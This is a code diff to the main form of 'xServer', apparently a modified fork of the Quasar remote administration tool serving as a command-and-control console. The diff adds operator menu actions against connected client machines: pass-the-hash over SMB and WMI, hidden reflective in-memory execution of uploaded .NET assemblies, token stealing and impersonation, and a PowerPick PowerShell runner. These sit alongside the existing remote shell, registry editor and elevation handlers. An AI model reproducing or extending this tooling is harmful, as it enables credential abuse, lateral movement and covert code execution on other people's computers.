@@ -20,6 +20,8 @@ namespace xServer.Forms
     {
         public QuasarServer ListenServer { get; set; }
         public static FrmMain Instance { get; private set; }
+        public Dictionary<string, Impersonation> impersonatedUsers = new Dictionary<string, Impersonation>();
+       
 
         private const int STATUS_ID = 4;
         private const int USERSTATUS_ID = 5;
@@ -529,92 +531,7 @@ namespace xServer.Forms
 
         #endregion
 
-        #region "System"
-
-        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                if (c.Value.FrmSi != null)
-                {
-                    c.Value.FrmSi.Focus();
-                    return;
-                }
-                FrmSystemInformation frmSI = new FrmSystemInformation(c);
-                frmSI.Show();
-            }
-        }
-
-        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                if (c.Value.FrmFm != null)
-                {
-                    c.Value.FrmFm.Focus();
-                    return;
-                }
-                FrmFileManager frmFM = new FrmFileManager(c);
-                frmFM.Show();
-            }
-        }
-
-        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                if (c.Value.FrmStm != null)
-                {
-                    c.Value.FrmStm.Focus();
-                    return;
-                }
-                FrmStartupManager frmStm = new FrmStartupManager(c);
-                frmStm.Show();
-            }
-        }
-
-        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                if (c.Value.FrmTm != null)
-                {
-                    c.Value.FrmTm.Focus();
-                    return;
-                }
-                FrmTaskManager frmTM = new FrmTaskManager(c);
-                frmTM.Show();
-            }
-        }
-
-        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                if (c.Value.FrmRs != null)
-                {
-                    c.Value.FrmRs.Focus();
-                    return;
-                }
-                FrmRemoteShell frmRS = new FrmRemoteShell(c);
-                frmRS.Show();
-            }
-        }
-
-        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                if (c.Value.FrmCon != null)
-                {
-                    c.Value.FrmCon.Focus();
-                    return;
-                }
-
-                FrmConnections frmCON = new FrmConnections(c);
-                frmCON.Show();
-            }
-        }
+        #region "Host"
 
         private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -628,33 +545,6 @@ namespace xServer.Forms
 
                 FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                 frmRS.Show();
-            }
-        }
-
-        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            if (lstClients.SelectedItems.Count != 0)
-            {
-                foreach (Client c in GetSelectedClients())
-                {
-                    if (c.Value.FrmRe != null)
-                    {
-                        c.Value.FrmRe.Focus();
-                        return;
-                    }
-
-                    FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
-                    frmRE.Show();
-                }
-            }
-        }
-
-        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                QuasarServer.writeLog("Attempting to Elevate (DoAskElevate())", c.Value.PCName);
-                new Core.Packets.ServerPackets.DoAskElevate().Execute(c);
             }
         }
 
@@ -682,6 +572,136 @@ namespace xServer.Forms
             {
                 QuasarServer.writeLog("Putting Client PC in Standby Mode", c.Value.PCName);
                 new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Standby).Execute(c);
+            }
+        }
+        private void sMBExecToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    var frm = new FrmPTH(c, "SMB");
+                    frm.Text = "Pass the Hash (SMB)";
+                    frm.Activate();
+                    frm.Show();
+                }
+            }
+        }
+
+        private void sHELLWINDOWSToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void systemInformationToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmSi != null)
+                {
+                    c.Value.FrmSi.Focus();
+                    return;
+                }
+                FrmSystemInformation frmSI = new FrmSystemInformation(c);
+                frmSI.Show();
+            }
+        }
+
+        private void askToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                QuasarServer.writeLog("Attempting to Elevate (DoAskElevate())", c.Value.PCName);
+                new Core.Packets.ServerPackets.DoAskElevate().Execute(c);
+            }
+        }
+
+        private void fileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmFm != null)
+                {
+                    c.Value.FrmFm.Focus();
+                    return;
+                }
+                FrmFileManager frmFM = new FrmFileManager(c);
+                frmFM.Show();
+            }
+        }
+
+        private void startupManagerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmStm != null)
+                {
+                    c.Value.FrmStm.Focus();
+                    return;
+                }
+                FrmStartupManager frmStm = new FrmStartupManager(c);
+                frmStm.Show();
+            }
+        }
+
+        private void remoteShellToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmRs != null)
+                {
+                    c.Value.FrmRs.Focus();
+                    return;
+                }
+                FrmRemoteShell frmRS = new FrmRemoteShell(c);
+                frmRS.Show();
+            }
+        }
+
+        private void taskManagerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmTm != null)
+                {
+                    c.Value.FrmTm.Focus();
+                    return;
+                }
+                FrmTaskManager frmTM = new FrmTaskManager(c);
+                frmTM.Show();
+            }
+        }
+
+        private void tCPConnectionsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmCon != null)
+                {
+                    c.Value.FrmCon.Focus();
+                    return;
+                }
+
+                FrmConnections frmCON = new FrmConnections(c);
+                frmCON.Show();
+            }
+        }
+
+        private void registryEditorToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    if (c.Value.FrmRe != null)
+                    {
+                        c.Value.FrmRe.Focus();
+                        return;
+                    }
+
+                    FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
+                    frmRE.Show();
+                }
             }
         }
 
@@ -960,24 +980,184 @@ namespace xServer.Forms
 
         private void wMIExecToolStripMenuItem1_Click(object sender, EventArgs e)
         {
+            //This is fine for now, need to re-code this to be fine when selecting multiple items.
             if(lstClients.SelectedItems.Count != 0)
             {
                 foreach(Client c in GetSelectedClients())
                 {
                     var frm = new FrmPTH(c, "WMI");
                     frm.Text = "Pass the Hash (WMI)";
+                    frm.Activate();
+                    frm.Show();
                 }
             }
         }
 
-        private void sMBExecToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void runLocalWMICommandToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("Sorry this feature is not yet enabled!");
+        }
+
+        private void wMIToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void hostFileToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void nETAssemblyInMemoryToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            //Client executes but crashes, why?
+            //Tried running again, didn't crash. Wonder why?
+            //Can't run form multiple times?
+            //Maybe it was because of the dual threading.
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
+                {
+                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
+                    {
+                        new Thread(() =>
+                        {
+                            bool error = false;
+                            foreach (Client c in GetSelectedClients())
+                            {
+                                if (c == null) continue;
+                                if (error) continue;
+                                QuasarServer.writeLog("Reflectively Executing .NET Assembly.", c.Value.PCName);
+                                try
+                                {
+                                    FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath); //New File Split
+                                    if (srcFile.MaxBlocks < 0)
+                                    {
+                                        QuasarServer.writeLog("Error Reading File: " + UploadAndExecute.FilePath + " (" + srcFile.LastError + ")", c.Value.PCName); //Write Log
+                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
+                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Show message box on failure.
+                                        error = true;
+                                        break;
+                                    }
+                                    int id = FileHelper.GetNewTransferId();
+                                    QuasarServer.writeLog("Uploading File", c.Value.PCName);
+                                    CommandHandler.HandleSetStatus(c,
+                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
+
+                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                                    {
+                                        byte[] block;
+                                        if (srcFile.ReadBlock(currentBlock, out block))
+                                        {
+                                            new Core.Packets.ServerPackets.DoExecuteAssembly(id,
+                                                Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
+                                                currentBlock, UploadAndExecute.RunHidden).Execute(c);
+                                        }
+                                        else
+                                        {
+                                            QuasarServer.writeLog("Error Reading File: " + UploadAndExecute.FilePath + " (" + srcFile.LastError + ")", c.Value.PCName);
+                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
+                                                "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                                            error = true;
+                                            break;
+                                        }
+                                    }
+
+                                }
+                                catch (Exception _Exception)
+                                {
+                                    MessageBox.Show("Exception caught in process: {0}", _Exception.ToString());
+                                }
+                                
+                              
+                            }
+                        }).Start();
+                    }
+                }
+            }
+        }
+
+        private void mSWORDDDEToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void makeTokenToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (lstClients.SelectedItems.Count != 0)
             {
                 foreach (Client c in GetSelectedClients())
                 {
-                    var frm = new FrmPTH(c, "SMB");
-                    frm.Text = "Pass the Hash (SMB)";
+                    var frm = new FrmImpersonate(c,true);
+                    frm.Activate();
+                    frm.Show();
+
+                }
+            }
+        }
+
+        private void stealProcessTokenToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    var frm = new FrmImpersonate(c,false);
+                    frm.Activate();
+                    frm.Show();
+                        
+                }
+            }
+        }
+
+        private void revertToSelfToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    new xServer.Core.Packets.ServerPackets.DoEnableImpersonation(false, "").Execute(c);
+                }
+
+            }
+        }
+
+        private void beginImpersonationToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    if (FrmMain.Instance.impersonatedUsers.Count() == 0)
+                    {
+                        MessageBox.Show("Please create a token before attempting to impersonate!");
+                        return;
+                    }
+                    FrmImpersonation frm = new FrmImpersonation(c);
+                    frm.Activate();
+                    frm.Show();
+                }
+
+            }
+
+            //TODO: Set an event handler that takes the response from the make/steal token.
+            //Fill a dictionary with those values and assigned to users.
+            //Columns - User, Impersonation Type (Impersonation,Delegation), Handle(?)
+            //Load the form and fill the box with the available tokens.
+            //Actually implement the impersonation logic (and revtoself)
+            //Impersonate > do stuff > Rev2Self
+
+        }
+
+        private void powerPickToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmPowerPick frm = new FrmPowerPick(c);
+                    frm.Activate();
+                    frm.Show();
                 }
             }
         }
